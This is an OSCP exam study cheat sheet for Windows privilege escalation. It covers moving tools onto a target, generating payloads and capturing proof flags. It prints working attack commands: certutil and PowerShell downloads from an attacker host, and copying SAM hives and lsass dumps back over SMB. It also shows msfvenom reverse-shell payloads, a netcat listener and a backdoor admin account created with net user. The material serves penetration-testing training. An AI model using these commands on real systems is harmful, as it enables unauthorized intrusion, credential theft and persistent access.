EXAM TOOLING RULES — read once, don't lose points

  • Allowed on every target: manual exploitation, msfvenom (payload generation), winPEAS / PowerUp / Seatbelt / SharpUp (enumeration), the Potato exploits, public PoCs you run yourself, nc, chisel, impacket.
  • Metasploit framework + Meterpreter: one single machine of your choice, for the whole exam. Don't burn it on a privesc you could do by hand — save it for a genuinely stuck initial foothold.
  • Banned: automated exploitation & mass scanners — sqlmap, Nessus/Nexpose, Burp Pro active scan, db_autopwn, any AI/auto-exploit tool.
  • Bottom line: privilege escalation on OSCP is almost always done with the manual techniques below — enumeration scanners and msfvenom are fair game, so you rarely need Metasploit here at all.

Before you can abuse anything

Getting your tools onto the box

winPEAS, PrintSpoofer, your payload — they live on your Kali box. Here's how to move them over, and how to send loot (SAM hives, dumps) back. Host a web or SMB server on your attack box first.

On Kali — serve the files
attacker.sh
# HTTP server in your tools folder
python3 -m http.server 80
# SMB server (great for two-way transfer)
impacket-smbserver share $(pwd) -smb2support
# catch the shell
rlwrap nc -lvnp 443
On target — pull them down
download.cmd
:: certutil (lives on every Windows)
certutil -urlcache -split -f http://KALI/winPEAS.exe p.exe
:: PowerShell
powershell iwr http://KALI/p.exe -o p.exe
powershell "(New-Object Net.WebClient).DownloadFile('http://KALI/p.exe','p.exe')"
:: SMB — run straight from the share
copy \\KALI\share\PrintSpoofer64.exe .
Send loot back to Kali
exfil.cmd
:: copy hives / dumps to the SMB share
copy C:\temp\sam.hive \\KALI\share\
copy C:\temp\lsass.dmp \\KALI\share\
Nowhere to write? Use these
writable.cmd
:: world-writable staging dirs
C:\Windows\Temp      :: usually writable by all
C:\temp  &  %TEMP%   :: your user's temp
:: find writable dirs with accesschk
accesschk -uwdqs Users c:\ /accepteula

Privilege & Potato reference

When whoami /priv shows one of these Enabled, you have a documented path. The second table picks the right Potato for the box's OS — the #1 thing beginners get wrong.

msfvenom — allowed on every target

Payload cookbook

The exact payload format matters: a service wants exe-service (a plain exe dies instantly), DLL hijacks want dll, AlwaysInstallElevated wants msi. Use shell_reverse_tcp (not meterpreter) to stay clear of the Metasploit restriction.

Generate the payload
msfvenom.sh
# standard reverse shell exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=443 -f exe -o rev.exe
# SERVICE exe — survives as a service
msfvenom ... -f exe-service -o svc.exe
# DLL hijack
msfvenom ... -f dll -o evil.dll
# AlwaysInstallElevated
msfvenom ... -f msi -o evil.msi
No payload needed — just add an admin
addadmin.cmd
:: run THIS as the command the vector executes
net user pwn P@ssw0rd123! /add
net localgroup administrators pwn /add
:: domain-joined? add to Domain Admins instead
net localgroup "Remote Desktop Users" pwn /add
:: then: evil-winrm / rdp / psexec in as pwn

Often the cleanest privesc isn't a reverse shell at all — have the SYSTEM vector run net user … /add, then log back in as your new admin with evil-winrm or psexec.py.

The exam is passed here, not in the shell

Capture proof before you touch anything else

The moment whoami returns SYSTEM, stop and screenshot. A flag you can't evidence is a flag you didn't earn. Your screenshot must show the proof contents and your attacking IP in the same frame.

Run these, screenshot the output
proof.cmd
whoami                 :: must read nt authority\system
hostname
ipconfig /all          :: show the target's IP
type C:\Users\Administrator\Desktop\proof.txt
Where the flags live

local.txt — user flag
C:\Users\<user>\Desktop\local.txt

proof.txt — root/SYSTEM flag
C:\Users\Administrator\Desktop\proof.txt

Grab local.txt the instant you get the first shell — don't wait until after privesc, in case the box resets. Note exact reproduction steps as you go; you're writing the report from them.

Learn from others' wasted hours

Traps that eat exam time

These are the mistakes that cost points. Read them now so you recognise them at 2 a.m. during the exam.

🕳️ Kernel exploit first

The trap: you see an old build in systeminfo and immediately hunt a kernel exploit. Why it hurts: they're unreliable and can crash the box. Kernel exploits are a last resort, after every misconfig is ruled out.

⏭️ Skimming winPEAS

The trap: the scanner spat out 800 lines, so you scroll past. Why it hurts: the intended path is usually a medium-severity (yellow) finding, not a red one. Read it slowly; the box is telling you the answer.

🔒 Forgetting it's a domain

The trap: grinding local privesc on a domain-joined machine. Why it hurts: the path may be an Active Directory problem (Kerberoast, ACLs), not local. Check ipconfig /all early.

🥔 Wrong Potato for the OS

The trap: JuicyPotato "doesn't work," so you give up on tokens. Why it hurts: JuicyPotato is patched on 2019+/Win11. With SeImpersonate, switch to PrintSpoofer or GodPotato — the win is still there.

💤 Plain exe for a service

The trap: you point a service at a normal reverse-shell exe and it dies in seconds. Why it hurts: services expect to talk to the Service Control Manager. Use -f exe-service, or have it run net user … /add.

📸 No proof screenshot

The trap: you get SYSTEM, grab the flag, move on — then realise you never captured proof. Why it hurts: a point you can't evidence is a point you didn't earn. Screenshot whoami + flag + your IP before anything else.
